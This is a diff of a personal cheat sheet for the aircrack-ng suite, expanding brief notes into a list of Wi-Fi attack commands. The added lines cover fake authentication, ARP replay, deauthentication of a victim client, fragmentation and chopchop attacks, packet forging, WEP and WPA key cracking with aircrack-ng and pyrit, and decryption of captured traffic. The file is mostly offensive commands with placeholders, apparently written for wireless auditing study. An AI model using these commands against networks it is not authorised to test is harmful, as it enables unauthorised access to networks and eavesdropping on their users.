@@ -1,4 +1,4 @@
-Basic commands for aircrack-ng:
+Cheat Sheet:
 auditing wireless networks
 
 airmon-ng - see if detect chipset/drivers
@@ -7,6 +7,7 @@ airmon-ng check - check if any proccess is problematic
 airmon-ng check kill - kill the proccess
 
 airmon-ng start wlan0 - start monitor mode
+airmon-ng start wlan0 3 - Start monitor mode on channel 3
 airmon-ng stop mon0 - stop monitor mode
 
 packet capture 
@@ -21,3 +22,63 @@ aireplay-ng -9 mon0  - Single card
 
 aireplay-ng -9 -i (revieving card wlan1) (mon0)
 
+
+Fake authentication to accociate with AP
+aireplay-ng -1 0 -e <ESSID> -a <AP MAC> -h <Attackers MAC> <interface>   - 0 represents how many times to re accociate to the AP
+
+Fake authentication with keystream file (For shared key bypass)
+ aireplay-ng -1 0 -e <ESSID> -y <keystream file> -a -<ap mac> -h <Attacker mac> <interface>
+ 
+ARP request replay attack
+aireplay-ng -3 -b <AP MAC> -h <Attackers MAC> <interface>
+ 
+De Authentication attack
+aireplay-ng -0 1 -a <AP MAC> -c <Victim Mac> <interface name>
+
+Interactive packet relay attack
+aireplay-ng -2 -b <AP MAC> -d FF:FF:FF:FF:FF:FF -t 1 <interface>
+
+Modified packet relay attack
+aireplay-ng -2 -b <AP MAC > -t 1 -c FF:FF:FF:FF:FF:FF -p 0841
+
+Natural packet relay attack
+aireplay-ng -2 -b <AP MAC> -d FF:FF:FF:FF:FF:FF -f 1 -m 68 -n 86 <interface>
+
+packet relay attack , inject with file
+aireplay-ng -2 -r capture.cap mon0
+
+Fragmentation attack
+aireplay-ng -5 -b <AP MAC> -h <ATTACKER MAC> mon0 
+
+korek chop chop
+aireplay-ng -4 -b <AP MAC> -h <ATTACKER MAC> <interface>
+
+Create ARP request packet using XOR file
+packetforge-ng -0 <AP MAC> -h <ATTACKERS MAC -h <DEST IP>  -l <SOURCE IP> -y <XOR FILE> -w <OUTPUT FILE>
+
+
+Cracking 64 bit. Aircrack will keep trying while it is getting more IVs, you can keep it running if it doesnt crack right away
+aircrack-ng -0 -z -n 64 capturefile.cap
+
+Cracking using wordless (dictionary attack)
+aircrack-ng -w <wordlist> capture.cap
+
+Pyrit------------------------------------------------------------------------------------
+pyrit -r catprue.cap analyize - see if handshake was catpured
+pyrit -r capture.cap -o <output.cap> strip - remove exccess data from file
+
+Pyrit for Rambow cracking:
+
+pyrit -i passwordlist.txt import_passwords - import passwords
+pyrit eval - check database passwords
+pyrit -e <essid> create_essid - create essid database
+pyrit batch - compute PMK
+
+pyrit -r capture.cap attack_db - start cracking
+
+.pyrit/blobspace   - remove this to remove database to have a clean state
+------------------------------------------------------------------------------------------
+
+airdecap-ng -b <Access point MAC> <capture.cap> - remove wireless headers
+airdecap-ng -w <WEP KEY> -b <AP MAC> <capture.cap> - decrypt WEP capture packets
+airdecap-ng -e <ESSID> -p <WPA PASSWORD> -b <AP MAC> <capture.cap> - decrypt WPA catpure
